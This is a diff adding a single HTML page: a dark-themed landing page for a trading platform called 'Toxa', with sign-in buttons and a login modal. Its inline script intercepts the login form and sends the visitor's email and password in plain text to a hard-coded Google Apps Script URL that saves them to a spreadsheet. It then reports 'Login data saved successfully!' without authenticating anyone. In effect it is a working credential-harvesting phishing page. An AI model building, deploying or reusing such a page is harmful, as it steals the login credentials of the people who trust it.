@@ -1,0 +1,947 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Toxa - Trade easily and conveniently</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Header Section -->
+    <header class="header-home">
+        <div class="container">
+            <div class="cover_outside special_cont">
+                <a href="/terminal" class="logo hid_sm">
+                    <img src="logo.svg" alt="logo">
+                </a>
+                <a href="/terminal" class="logo vis_sm">
+                    <img src="logo.svg" alt="logo">
+                </a>
+                <div class="cover_inside">
+                    <div class="widget-login_block">
+                        <a href="#" data-rel="sign_in" class="yellow_btn btn popup-open">Sign in</a>
+                        <a href="#" data-rel="sign_up" class="white_btn btn popup-open blick">Sign up</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="first-screen" id="first-screen">
+        <div class="anim_element">
+            <div class="container">
+                <div class="hero-content">
+                    <div class="text_block">
+                        <p class="main_title">Trade <span class="highlight">easily</span> and conveniently</p>
+                        <span class="small">A simple and reliable platform with fast payouts</span>
+                        <a href="#" class="btn_reg popup-open" data-rel="sign_up"><span>Try for 0</span></a>
+                    </div>
+                    <div class="img_block">
+                        <img srcset="phone-mockup.png, phone-mockup.png 1.5x" src="phone-mockup.png" alt="Trading app mockup">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Login Modal Only -->
+    <div id="block-modals">
+        <!-- Login Modal -->
+        <div class="modal_popup modal_form-sign_in">
+            <div class="popup_box">
+                <div class="close">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none">
+                        <mask id="mask0_638_10" style="mask-type:alpha" maskUnits="userSpaceOnUse" x="0" y="0" width="16" height="16">
+                            <rect width="16" height="16" fill="#D9D9D9"></rect>
+                        </mask>
+                        <g mask="url(#mask0_638_10)">
+                            <path d="M8.00003 8.93337L4.73337 12.2C4.61114 12.3223 4.45559 12.3834 4.2667 12.3834C4.07781 12.3834 3.92225 12.3223 3.80003 12.2C3.67781 12.0778 3.6167 11.9223 3.6167 11.7334C3.6167 11.5445 3.67781 11.3889 3.80003 11.2667L7.0667 8.00003L3.80003 4.73337C3.67781 4.61114 3.6167 4.45559 3.6167 4.2667C3.6167 4.07781 3.67781 3.92225 3.80003 3.80003C3.92225 3.67781 4.07781 3.6167 4.2667 3.6167C4.45559 3.6167 4.61114 3.67781 4.73337 3.80003L8.00003 7.0667L11.2667 3.80003C11.3889 3.67781 11.5445 3.6167 11.7334 3.6167C11.9223 3.6167 12.0778 3.67781 12.2 3.80003C12.3223 3.92225 12.3834 4.07781 12.3834 4.2667C12.3834 4.45559 12.3223 4.61114 12.2 4.73337L8.93337 8.00003L12.2 11.2667C12.3223 11.3889 12.3834 11.5445 12.3834 11.7334C12.3834 11.9223 12.3223 12.0778 12.2 12.2C12.0778 12.3223 11.9223 12.3834 11.7334 12.3834C11.5445 12.3834 11.3889 12.3223 11.2667 12.2L8.00003 8.93337Z" fill="#BFC5C3"></path>
+                        </g>
+                    </svg>
+                </div>
+                <div class="popup_cont">
+                    <p class="title">Login to Toxa</p>
+                    <form action="#" method="post">
+                        <ul>
+                            <li>
+                                <div class="form-group">
+                                    <input type="text" class="form-control" placeholder="Email" required>
+                                </div>
+                            </li>
+                            <li>
+                                <div class="form-group">
+                                    <input type="password" class="form-control" placeholder="Password" required>
+                                </div>
+                            </li>
+                            <li>
+                                <button type="submit" class="yellow_btn btn form-submit">Login to profile</button>
+                            </li>
+                        </ul>
+                    </form>
+                    <div class="login_th_block">
+                        <span class="th_text">Login using</span>
+                        <div class="social-login">
+                            <a href="#" class="google-btn">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                                    <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                                    <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+                                    <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+                                </svg>
+                            </a>
+                        </div>
+                    </div>
+                    <div class="follow_block">
+                        <a href="#">Register</a>
+                        <a href="#">Forgot your password?</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="overlay"></div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
+
+<style>
+    * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    background-color: #0F0F0F;
+    color: #fff;
+}
+
+/* ========================================
+   HEADER SECTION STYLES
+======================================== */
+
+/* Header Styles */
+header {
+    background-color: transparent;
+    padding: 21px 0;
+    display: flex;
+    align-items: center;
+    flex-direction: row;
+}
+
+@media (max-width: 767px) {
+    header {
+        padding: 8px 0;
+    }
+}
+
+/* Container Styles */
+.container {
+    margin: 0 auto;
+    width: 1230px;
+    max-width: 100%;
+    padding-left: 15px;
+    padding-right: 15px;
+}
+
+@media (max-width: 1199px) {
+    .container {
+        width: 970px;
+    }
+}
+
+@media (max-width: 992px) {
+    .container {
+        width: 730px;
+    }
+}
+
+@media (max-width: 767px) {
+    .container {
+        width: 100%;
+    }
+}
+
+header .container {
+    max-width: 1920px;
+    margin-right: auto;
+    margin-left: auto;
+    width: 100%;
+    padding-left: 40px;
+    padding-right: 40px;
+}
+
+@media (max-width: 767px) {
+    header .container {
+        padding-left: 12px;
+        padding-right: 12px;
+    }
+}
+
+/* Cover Outside */
+header .cover_outside {
+    align-items: center;
+    display: flex;
+    justify-content: space-between;
+}
+
+@media (max-width: 991px) {
+    header .cover_outside {
+        position: relative;
+    }
+}
+
+/* Logo Styles */
+header a.logo {
+    justify-content: space-between;
+    max-width: 200px;
+}
+
+.logo.hid_sm {
+    display: block;
+}
+
+.logo.vis_sm {
+    display: none;
+}
+
+@media (max-width: 991px) {
+    .logo.hid_sm {
+        display: none;
+    }
+    
+    .logo.vis_sm {
+        display: block;
+    }
+}
+
+@media (max-width: 767px) {
+    .logo.vis_sm {
+        width: 107px;
+    }
+}
+
+.logo img {
+    width: 100%;
+    height: auto;
+}
+
+/* Cover Inside */
+header .cover_inside {
+    display: flex;
+    align-items: center;
+    position: relative;
+    z-index: 2;
+}
+
+/* Widget Login Block */
+.widget-login_block {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 8px;
+    background-color: rgba(255, 255, 255, 0.1);
+    backdrop-filter: blur(7.5px);
+    -webkit-backdrop-filter: blur(7.5px);
+    border-radius: 16px;
+    margin-left: 24px;
+}
+
+@media (max-width: 1199px) {
+    .widget-login_block {
+        margin-left: auto;
+    }
+}
+
+/* Yellow Button (Sign in) */
+.yellow_btn.btn {
+    text-decoration: none;
+    color: #fff;
+    height: 58px;
+    border-radius: 12px;
+    padding-left: 24px;
+    margin-right: 8px;
+    padding-right: 24px;
+    text-align: center;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    background-color: #0F0F0F;
+    font-size: 16px;
+    font-weight: 500;
+    transition: 0.3s ease;
+}
+
+@media (max-width: 767px) {
+    .yellow_btn.btn {
+        padding-left: 21px;
+        padding-right: 21px;
+    }
+    
+    header.header-home .yellow_btn.btn {
+        height: 48px;
+        font-size: 14px;
+    }
+}
+
+/* White Button (Sign up) */
+.white_btn.btn {
+    font-size: 16px;
+    font-weight: 500;
+    border-radius: 12px;
+    background: linear-gradient(270deg, #FEE800 0%, #FFAF00 100%);
+    box-shadow: 0px 9px 44px rgba(9, 14, 18, 0.5);
+    text-decoration: none;
+    color: #0F0F0F;
+    display: inline-flex;
+    align-items: center;
+    padding-left: 24px;
+    padding-right: 24px;
+    height: 58px;
+    justify-content: center;
+    position: relative;
+    overflow: hidden;
+    transition: .3s ease;
+}
+
+@media (max-width: 767px) {
+    .white_btn.btn {
+        padding-left: 15px;
+        padding-right: 15px;
+    }
+    
+    header.header-home .white_btn.btn.popup-open {
+        height: 48px;
+        font-size: 14px;
+    }
+}
+
+/* Shine Animation for Sign up button */
+.white_btn.btn:before {
+    content: "";
+    width: 100%;
+    position: absolute;
+    height: 100%;
+    background: linear-gradient(135deg, rgba(255, 255, 255, 0) 38.78%, rgba(255, 255, 255, 0.6) 46.4%, rgba(255, 255, 255, 0) 55.84%);
+    left: 0;
+    animation: btn_anim 2.5s linear infinite;
+}
+
+@keyframes btn_anim {
+    0% {
+        transform: translateX(-100%);
+    }
+    100% {
+        transform: translateX(200%);
+    }
+}
+
+/* Hover Effects */
+.yellow_btn.btn:hover {
+    background-color: #1a1a1a;
+}
+
+.white_btn.btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0px 12px 50px rgba(9, 14, 18, 0.6);
+}
+
+/* ========================================
+   HERO SECTION STYLES
+======================================== */
+
+/* Hero Section - First Screen */
+.first-screen {
+    padding-top: 120px;
+    padding-bottom: 80px;
+    position: relative;
+    overflow: hidden;
+    margin-top: -116px;
+}
+
+@media (max-width: 1199px) {
+    .first-screen {
+        padding-top: 140px;
+        padding-bottom: 60px;
+    }
+}
+
+@media (max-width: 767px) {
+    .first-screen {
+        padding-top: 140px;
+        padding-bottom: 40px;
+    }
+}
+
+/* Background Animation */
+.first-screen:before {
+    content: "";
+    background-image: radial-gradient(circle at center, rgba(254, 232, 0, 0.15) 0%, rgba(255, 175, 0, 0.1) 30%, transparent 70%);
+    width: 100%;
+    height: calc(100% + 173px);
+    position: absolute;
+    left: 50%;
+    top: 50%;
+    transform: translate(-50%, -50%);
+    transform-origin: center center;
+    background-size: 100% auto;
+    background-repeat: no-repeat;
+    transition: .5s ease;
+    z-index: -1;
+    animation: first-scale 8s linear infinite;
+}
+
+@keyframes first-scale {
+    0%, 100% {
+        transform: translate(-50%, -50%) scale(1);
+    }
+    50% {
+        transform: translate(-50%, -58%) scale(1.05);
+    }
+}
+
+.anim_element {
+    position: relative;
+    width: 100%;
+    height: 100%;
+}
+
+/* Hero Content - Centered Layout */
+.hero-content {
+    display: flex;
+    flex-direction: row-reverse;
+    align-items: center;
+    justify-content: center;
+    /* text-align: center; */
+    width: 100%;
+}
+
+@media (max-width: 767px) {
+    .hero-content {
+        padding: 0 15px;
+    text-align: center;
+
+         flex-direction: column;
+    }
+}
+
+/* Text Block */
+.text_block {
+    width: 100%;
+    max-width: 800px;
+    margin-bottom: 30px;
+}
+
+@media (max-width: 767px) {
+    .text_block {
+        margin-bottom: 10px;
+    }
+}
+
+/* Main Title */
+.main_title {
+    font-size: 90px;
+    font-weight: bold;
+    line-height: 1;
+    margin-bottom: 48px;
+    text-align: left;
+    color: #fff;
+}
+
+@media (max-width: 1199px) {
+    .main_title {
+        font-size: 70px;
+    }
+}
+
+@media (max-width: 767px) {
+    .main_title {
+         text-align: center;
+        font-size: 40px;
+        margin-bottom: 24px;
+        line-height: 1;
+    }
+}
+
+/* Yellow Pill Highlight for "easily" */
+.main_title .highlight {
+    background: linear-gradient(270deg, #FEE800 0%, #FFAF00 100%);
+    color: #0F0F0F;
+    /* padding: 8px 32px; */
+    border-radius: 10px;
+    display: inline-block;
+    font-weight: bold;
+}
+
+@media (max-width: 767px) {
+    .main_title .highlight {
+        /* padding: 4px 20px; */
+        font-size: 40px;
+    }
+}
+
+/* Small Description Text */
+.small {
+    font-size: 24px;
+    font-weight: 500;
+    color: #bfc5c3;
+    display: block;
+    margin-bottom: 48px;
+}
+
+@media (max-width: 1199px) {
+    .small {
+        font-size: 20px;
+    }
+}
+
+@media (max-width: 767px) {
+    .small {
+        font-size: 16px;
+        margin-bottom: 32px;
+    }
+}
+
+/* Try for 0 Button */
+.btn_reg {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    font-size: 20px;
+    font-weight: 600;
+    border-radius: 12px;
+    background: linear-gradient(270deg, #FEE800 0%, #FFAF00 100%);
+    box-shadow: 0px 9px 44px rgba(9, 14, 18, 0.5);
+    text-decoration: none;
+    color: #0F0F0F;
+    display: inline-flex;
+    align-items: center;
+    width: 200px;
+    height: 60px;
+    justify-content: center;
+    position: relative;
+    overflow: hidden;
+    transition: .3s ease;
+}
+
+@media (max-width: 767px) {
+    .btn_reg {
+        width: 200px;
+        height: 56px;
+        font-size: 16px;
+    }
+}
+
+@media (max-width: 767px) {
+    .btn_reg {
+        width: 180px;
+        height: 56px;
+        font-size: 16px;
+    }
+}
+
+/* ========================================
+   MODAL POPUP STYLES
+======================================== */
+
+/* Overlay Background */
+.overlay {
+    backdrop-filter: blur(40px);
+    -webkit-backdrop-filter: blur(40px);
+    background-color: rgba(37, 36, 35, .1);
+    opacity: 0;
+    z-index: -1;
+    transition: .3s ease;
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+}
+
+.overlay.active {
+    opacity: 1;
+    z-index: 5;
+}
+
+/* Modal Popup Container */
+.modal_popup {
+    position: fixed;
+    left: 50%;
+    top: 50%;
+    transform: translate(-50%, -50%);
+    width: 373px;
+    max-width: 90%;
+    background-color: rgba(8, 6, 4, 0.3);
+    backdrop-filter: blur(40px);
+    -webkit-backdrop-filter: blur(40px);
+    border-radius: 24px;
+    padding: 40px 35px;
+    opacity: 0;
+    z-index: -1;
+    color: #fff;
+    transition: .3s ease;
+}
+
+@media (max-width: 480px) {
+    .modal_popup {
+        width: 90%;
+        padding: 30px 20px;
+    }
+}
+
+.modal_popup.active {
+    opacity: 1;
+    z-index: 6;
+}
+
+/* Close Button */
+.modal_popup .close {
+    position: absolute;
+    top: 0;
+    right: 0;
+    font-size: 0;
+    padding: 16px;
+    cursor: pointer;
+    transition: .3s ease;
+    opacity: 1;
+}
+
+.modal_popup .close:hover {
+    opacity: 0.7;
+}
+
+/* Modal Title */
+.modal_popup .title {
+    font-weight: 500;
+    font-size: 30px;
+    text-align: center;
+    margin-bottom: 32px;
+    line-height: 30px;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+}
+
+@media (max-width: 480px) {
+    .modal_popup .title {
+        font-size: 24px;
+        margin-bottom: 24px;
+    }
+}
+
+/* Form Styles */
+.modal_popup form {
+    max-width: 100%;
+    margin: 0 auto;
+}
+
+.modal_popup ul {
+    list-style: none;
+    padding: 0;
+    margin: 0;
+}
+
+.modal_popup ul li {
+    margin-bottom: 16px;
+}
+
+.modal_popup .form-group {
+    width: 100%;
+}
+
+.modal_popup .form-control {
+    width: 100%;
+    height: 56px;
+    background-color: rgba(255, 255, 255, 0.05);
+    border: 1px solid rgba(191, 197, 195, 0.2);
+    border-radius: 12px;
+    padding: 16px 20px;
+    color: #fff;
+    font-size: 16px;
+    font-weight: 400;
+    transition: .3s ease;
+    outline: none;
+}
+
+.modal_popup .form-control::placeholder {
+    color: #BFC5C3;
+}
+
+.modal_popup .form-control:focus {
+    border-color: rgba(254, 232, 0, 0.5);
+    background-color: rgba(255, 255, 255, 0.08);
+}
+
+/* Submit Button */
+.modal_popup .form-submit {
+    width: 100%;
+    height: 56px;
+    background: linear-gradient(270deg, #FEE800 0%, #FFAF00 100%);
+    border-radius: 12px;
+    border: none;
+    color: #0F0F0F;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: .3s ease;
+    position: relative;
+    overflow: hidden;
+}
+
+.modal_popup .form-submit:before {
+    content: "";
+    width: 100%;
+    position: absolute;
+    height: 100%;
+    background: linear-gradient(135deg, rgba(255, 255, 255, 0) 38.78%, rgba(255, 255, 255, 0.6) 46.4%, rgba(255, 255, 255, 0) 55.84%);
+    left: 0;
+    animation: btn_anim 2.5s linear infinite;
+}
+
+.modal_popup .form-submit:hover {
+    transform: translateY(-2px);
+    box-shadow: 0px 9px 44px rgba(254, 232, 0, 0.5);
+}
+
+/* Login Through Block */
+.login_th_block {
+    margin-top: 24px;
+    text-align: center;
+}
+
+@media (max-width: 480px) {
+    .login_th_block {
+        flex-flow: column;
+    }
+}
+
+.login_th_block .th_text {
+    color: #BFC5C3;
+    font-size: 14px;
+    font-style: normal;
+    font-weight: 500;
+    margin-bottom: 16px;
+    line-height: 1.2;
+    display: block;
+    text-align: center;
+}
+
+@media (max-width: 480px) {
+    .login_th_block .th_text {
+        margin-right: 0;
+        margin-top: 0;
+    }
+}
+
+/* Social Login */
+.social-login {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin-bottom: 20px;
+}
+
+.google-btn {
+    width: 48px;
+    height: 48px;
+    background-color: rgba(255, 255, 255, 0.1);
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: .3s ease;
+    cursor: pointer;
+}
+
+.google-btn:hover {
+    background-color: rgba(255, 255, 255, 0.2);
+}
+
+/* Follow Block */
+.follow_block {
+    margin-top: 24px;
+    text-align: center;
+}
+
+.follow_block p {
+    color: #BFC5C3;
+    font-size: 14px;
+    margin-bottom: 8px;
+    line-height: 1.5;
+}
+
+.follow_block a {
+    color: #FEE800;
+    text-decoration: none;
+    font-weight: 500;
+    transition: .3s ease;
+}
+
+.follow_block a:hover {
+    color: #FFAF00;
+}
+
+
+.btn_reg:before {
+    content: "";
+    width: 100%;
+    position: absolute;
+    height: 100%;
+    background: linear-gradient(135deg, rgba(255, 255, 255, 0) 38.78%, rgba(255, 255, 255, 0.6) 46.4%, rgba(255, 255, 255, 0) 55.84%);
+    left: 0;
+    animation: btn_anim 2.5s linear infinite;
+}
+
+.btn_reg:after {
+    content: "";
+    width: 100%;
+    position: absolute;
+    height: 100%;
+    background: linear-gradient(135deg, rgba(255, 255, 255, 0) 38.78%, rgba(255, 255, 255, 0.6) 46.4%, rgba(255, 255, 255, 0) 55.84%);
+}
+
+.btn_reg span {
+    position: relative;
+    z-index: 1;
+}
+
+.btn_reg:hover {
+    transform: translateY(-2px);
+    box-shadow: 0px 12px 50px rgba(254, 232, 0, 0.5);
+}
+
+/* Image Block - Phone Mockup */
+.img_block {
+    width: 100%;
+    max-width: 500px;
+    margin: 0 auto;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+@media (max-width: 767px) {
+    .img_block {
+        max-width: 100%;
+        position: relative;
+        left: -55px;
+    }
+}
+
+.img_block img {
+    max-width: 100%;
+    width: 400px;
+    height: auto;
+    display: block;
+    margin: 0 auto;
+}
+
+@media (max-width: 767px) {
+    .img_block img {
+        width: 350px;
+        max-width: 100%;
+    }
+}
+</style>
+
+
+<script>
+// Modal Popup Functionality - Login with Google Sheets Integration
+
+document.addEventListener('DOMContentLoaded', function() {
+    // IMPORTANT: Yahan apna Google Apps Script Web App URL dalo
+const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwETD5lXhy_sr5gfur4hy_d_2UUfGHFDf9qEEn6Tzng63GVGa9wlYmyeQ7BL1reQcJgQQ/exec';    // Get all elements
+    const signInButtons = document.querySelectorAll('[data-rel="sign_in"]');
+    const closeButton = document.querySelector('.modal_popup .close');
+    const overlay = document.querySelector('.overlay');
+    const signInModal = document.querySelector('.modal_form-sign_in');
+
+    // Open Sign In Modal
+    signInButtons.forEach(button => {
+        button.addEventListener('click', function(e) {
+            e.preventDefault();
+            signInModal.classList.add('active');
+            overlay.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        });
+    });
+
+    // Close Modal on Close Button Click
+    if (closeButton) {
+        closeButton.addEventListener('click', function() {
+            closeModal();
+        });
+    }
+
+    // Close Modal on Overlay Click
+    if (overlay) {
+        overlay.addEventListener('click', function() {
+            closeModal();
+        });
+    }
+
+    // Close Modal on ESC Key
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape') {
+            closeModal();
+        }
+    });
+
+    // Function to close modal
+    function closeModal() {
+        signInModal.classList.remove('active');
+        overlay.classList.remove('active');
+        document.body.style.overflow = '';
+    }
+
+    // Form Submit with Google Sheets Integration
+    const form = document.querySelector('.modal_popup form');
+    if (form) {
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Get form values
+            const emailInput = form.querySelector('input[type="text"]');
+            const passwordInput = form.querySelector('input[type="password"]');
+            const submitButton = form.querySelector('.form-submit');
+            
+            const email = emailInput.value;
+            const password = passwordInput.value;
+            
+            // Disable button during submission
+            submitButton.disabled = true;
+            submitButton.textContent = 'Submitting...';
+            
+            // Create form data
+            const formData = new FormData();
+            formData.append('email', email);
+            formData.append('password', password);
+            
+            // Send to Google Sheets
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+                alert('Login data saved successfully!');
+                
+                // Reset form
+                form.reset();
+                closeModal();
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                alert('Error saving data. Please try again.');
+            })
+            .finally(() => {
+                // Re-enable button
+                submitButton.disabled = false;
+                submitButton.textContent = 'Login to profile';
+            });
+        });
+    }
+});
+</script>
